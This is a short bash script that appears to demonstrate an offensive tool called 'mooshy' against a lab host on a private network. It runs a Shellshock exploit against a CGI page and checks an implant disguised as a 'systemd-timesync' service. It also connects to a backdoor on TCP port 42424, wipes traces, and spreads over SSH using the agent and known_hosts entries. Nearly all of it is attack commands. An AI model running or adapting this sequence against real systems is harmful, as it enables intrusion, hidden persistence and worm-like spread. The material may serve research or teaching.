#!/usr/bin/env bash
set -e

./bin/mooshy-linux-amd64 -tcp :42424 -addr 192.168.188.28:22

ssh 192.168.188.28 'cat /usr/lib/cgi-bin/index.cgi'
curl -sL http://192.168.188.28/cgi-bin/index.cgi
ssh 192.168.188.28 'cat /lib/systemd/system/systemd-timesync.service'
ssh 192.168.188.28 'ls -alh /lib/systemd/systemd-timesync'

./bin/mooshy-linux-amd64 -shellShock -addr http://192.168.188.28/cgi-bin/index.cgi
ssh 192.168.188.28 'cat /lib/systemd/system/systemd-timesync.service'
ssh 192.168.188.28 'ls -alh /lib/systemd/systemd-timesync'

./bin/mooshy-linux-amd64 -tcp :42424 -addr 192.168.188.28:22

./bin/mooshy-linux-amd64 -tcp :42424 -addr 192.168.188.28:22 -wipe 
ssh 192.168.188.28 'cat /lib/systemd/system/systemd-timesync.service'
ssh 192.168.188.28 'ls -alh /lib/systemd/systemd-timesync'

./bin/mooshy-linux-amd64 -tcp :42424 -addr 192.168.188.28:22

cat ~/.ssh/known_hosts | grep '192.168.188.28' > known_hosts
cat known_hosts
./bin/mooshy-linux-amd64 -ssh -useSSHAgent -useSSHKnown -sshKnown known_hosts
./bin/mooshy-linux-amd64 -tcp :42424 -addr 192.168.188.28:22
./bin/mooshy-linux-amd64 -tcp :42424 -addr 192.168.188.28:22 -wipe 
